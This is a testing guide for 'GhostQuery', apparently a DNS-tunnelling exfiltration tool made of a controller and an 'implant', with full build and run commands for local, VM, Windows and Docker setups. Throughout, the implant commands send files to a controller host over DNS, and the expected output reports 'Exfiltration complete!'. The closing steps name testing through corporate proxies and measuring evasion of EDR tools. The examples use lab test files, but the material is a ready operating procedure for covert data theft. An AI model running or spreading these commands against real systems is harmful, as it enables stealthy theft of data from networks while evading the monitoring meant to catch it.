# GhostQuery Testing Guide

## Quick Local Test (Single Machine)

This is the fastest way to test if everything works.

### Step 1: Build the Project

```bash
cd GhostQueryProtocol
cargo build --release
```

### Step 2: Terminal 1 - Start Controller

```bash
# Use unprivileged port (no sudo needed)
./target/release/gq-controller \
  --bind 127.0.0.1:5353 \
  --domain test.local \
  --output ./received \
  --verbose
```

**Important**: Copy the master key that gets printed! It looks like:
```
Generated random master key: a1b2c3d4e5f6789...
```

### Step 3: Terminal 2 - Create Test File and Run Implant

```bash
# Create a test file
echo "This is secret test data for GhostQuery protocol" > test.txt

# Run implant (replace <KEY> with the key from step 2)
./target/release/gq-implant \
  --file test.txt \
  --domain test.local \
  --server 127.0.0.1:5353 \
  --key <PASTE-KEY-HERE> \
  --verbose
```

### Step 4: Verify

```bash
# Check received files
ls -lh ./received/

# Compare original and received
sha256sum test.txt
sha256sum ./received/*.bin

# View content
cat ./received/*.bin
```

## VM Testing (More Realistic)

### Setup: Two Virtual Machines

**VM1 (Controller) - Ubuntu Server:**

```bash
# Install Rust
curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh
source $HOME/.cargo/env

# Clone/copy project
cd GhostQueryProtocol
cargo build --release

# Run controller (needs sudo for port 53)
sudo ./target/release/gq-controller \
  --bind 0.0.0.0:53 \
  --domain ghost.local \
  --output ~/received \
  --verbose

# SAVE THE KEY THAT GETS PRINTED!
```

**VM2 (Implant) - Any OS:**

```bash
# Create test file
echo "Sensitive data from VM2" > secret.txt

# Get VM1's IP address
# Example: 192.168.1.100

# Run implant
./target/release/gq-implant \
  --file secret.txt \
  --domain ghost.local \
  --server 192.168.1.100:53 \
  --key <KEY-FROM-VM1> \
  --verbose
```

**Verify on VM1:**

```bash
ls -lh ~/received/
cat ~/received/*.bin
```

## Windows Testing

### Build Windows Executable

On your Mac:

```bash
# Install cross-compilation tool
cargo install cross

# Build Windows binaries
./build-windows.sh

# Binaries will be in dist/windows/
```

### Test on Windows VM

1. Copy `dist/windows/` folder to Windows VM

2. **PowerShell as Administrator** (Terminal 1):
```powershell
cd dist\windows
.\gq-controller.exe -b 127.0.0.1:5353 -d test.local -o .\output -v
```

3. **PowerShell** (Terminal 2):
```powershell
cd dist\windows
echo "Test data" > test.txt
.\gq-implant.exe -f test.txt -d test.local -s 127.0.0.1:5353 -k <KEY> -v
```

4. Check `output\` folder for received file

## Docker Testing

Create `docker-compose.test.yml`:

```yaml
version: '3.8'
services:
  controller:
    image: rust:latest
    volumes:
      - .:/app
    working_dir: /app
    command: >
      bash -c "
        cargo build --release &&
        mkdir -p /output &&
        ./target/release/gq-controller 
          -b 0.0.0.0:53 
          -d ghost.local 
          -o /output 
          -k 0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef
          -v
      "
    ports:
      - "5353:53/udp"
    networks:
      - testnet

  implant:
    image: rust:latest
    volumes:
      - .:/app
    working_dir: /app
    depends_on:
      - controller
    command: >
      bash -c "
        sleep 10 &&
        echo 'Docker test data' > /tmp/test.txt &&
        cargo build --release &&
        ./target/release/gq-implant 
          -f /tmp/test.txt 
          -d ghost.local 
          -s controller:53 
          -k 0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef
          -v
      "
    networks:
      - testnet

networks:
  testnet:
```

Run:
```bash
docker-compose -f docker-compose.test.yml up
```

## Troubleshooting

### "Permission denied" on port 53

**Solution 1**: Use unprivileged port
```bash
./gq-controller --bind 0.0.0.0:5353 ...
```

**Solution 2**: Run as root
```bash
sudo ./gq-controller --bind 0.0.0.0:53 ...
```

**Solution 3** (Linux only): Grant capabilities
```bash
sudo setcap CAP_NET_BIND_SERVICE=+eip ./target/release/gq-controller
./gq-controller --bind 0.0.0.0:53 ...
```

### "Connection refused" or timeout

1. Check firewall:
```bash
# Ubuntu/Debian
sudo ufw allow 5353/udp

# CentOS/RHEL
sudo firewall-cmd --add-port=5353/udp --permanent
sudo firewall-cmd --reload
```

2. Verify controller is listening:
```bash
sudo netstat -ulnp | grep 5353
# or
sudo ss -ulnp | grep 5353
```

3. Test DNS connectivity:
```bash
dig @<controller-ip> -p 5353 test.ghost.local
```

### Build errors

```bash
# Update Rust
rustup update

# Clean build
cargo clean
cargo build --release
```

### Windows: "VCRUNTIME140.dll not found"

Install Visual C++ Redistributable:
https://aka.ms/vs/17/release/vc_redist.x64.exe

## Expected Output

### Controller Output:
```
GhostQuery Controller starting...
Generated random master key: a1b2c3d4e5f6...
Share this key with the implant!
Listening on 127.0.0.1:5353
Authoritative for domain: test.local
Session abc123... initialized
Session abc123... chunk 0 acked
Session abc123... chunk 1 acked
...
Session abc123... all chunks received
Session abc123... saved to ./received/abc123....bin
```

### Implant Output:
```
GhostQuery Implant starting...
Target file: "test.txt"
Domain: test.local
Starting exfiltration...
Chunk 0 sent and acknowledged
Chunk 1 sent and acknowledged
...
Exfiltration complete!
Chunks sent: 5
Chunks acked: 5
Bytes sent: 160
```

## Performance Testing

Test with larger files:

```bash
# Create 1MB test file
dd if=/dev/urandom of=large.bin bs=1M count=1

# Time the exfiltration
time ./target/release/gq-implant \
  -f large.bin \
  -d test.local \
  -s 127.0.0.1:5353 \
  -k <KEY> \
  --delay 10  # Faster for testing
```

## Security Testing

### Test encryption:

```bash
# Capture traffic
sudo tcpdump -i lo -w capture.pcap port 5353

# Run exfiltration
./target/release/gq-implant -f secret.txt ...

# Analyze capture - data should be encrypted
tcpdump -r capture.pcap -X
# You should see encrypted/encoded data, not plaintext
```

### Test with wrong key:

```bash
# This should fail
./target/release/gq-implant \
  -f test.txt \
  -s 127.0.0.1:5353 \
  -k 0000000000000000000000000000000000000000000000000000000000000000
```

## Next Steps

Once basic testing works:

1. Test with real DNS infrastructure
2. Test through corporate proxy
3. Measure detection rates with various EDR tools
4. Performance tuning (chunk size, window size, delays)
5. Test ICMP side-channel (requires raw socket permissions)

## Support

If you encounter issues:

1. Check logs with `--verbose` flag
2. Verify network connectivity
3. Check firewall rules
4. Ensure matching keys between controller and implant
5. Review the error messages carefully

